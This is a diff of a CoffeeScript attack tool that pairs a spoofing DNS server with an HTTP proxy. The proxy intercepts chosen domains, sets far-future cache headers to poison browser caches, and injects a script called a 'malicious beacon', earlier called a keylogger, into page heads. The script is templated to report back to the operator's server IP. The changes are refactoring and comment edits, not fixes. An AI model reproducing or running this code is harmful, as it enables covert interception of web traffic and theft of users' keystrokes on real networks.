@@ -1,15 +1,19 @@
 
 url = require 'url'
-target_urls = require './target_urls'
-dns = require 'native-dns'
-httpProxy = require 'http-proxy'
 fs = require 'fs'
 querystring = require 'querystring'
 
-intercept_domains = []
+dns = require 'native-dns'
+httpProxy = require 'http-proxy'
+
+target_urls = require './target_urls'
+
+if not process.env.PUBLIC_IP?
+  console.log 'Set the environment variable PUBLIC_IP to the IP of this server'
+  exit(1)
 
 UPSTREAM_DNS = process.env.UPSTREAM_DNS or '8.8.8.8'
-PUBLIC_IP = process.env.PUBLIC_IP or '54.242.214.102'
+PUBLIC_IP = process.env.PUBLIC_IP
 DNS_TTL = 60
 DNS_TIMEOUT = 1000
 DNS_PORT = 53
@@ -17,6 +21,8 @@ HTTP_PORT = 80
 CACHE_EXPIRE = 'Tue, 31 Oct 2017 20:00:00 GMT'
 
 beacon = fs.readFileSync('beacon.js').toString().replace('{{IP}}', PUBLIC_IP)
+
+intercept_domains = []
 
 cache_poisoned = false
 
@@ -63,7 +69,7 @@ server = httpProxy.createServer (req, res, proxy) ->
         headers['expires'] = CACHE_EXPIRE
 
         # buffer the response until it is complete, so we can inject
-        # it with the keylogger
+        # it with the malicious beacon code
         data = ''
         res.oldWrite = res.write
         res.write = (chunk) ->
@@ -71,9 +77,6 @@ server = httpProxy.createServer (req, res, proxy) ->
 
         res.oldEnd = res.end
         res.end = ->
-          # We want to inject the keylogger into the <head> element
-          # without clashing with <meta http-equiv> tags, so we insert
-          # it after the title closing tag.
           data = inject data
           res.oldWrite data
           res.oldEnd()
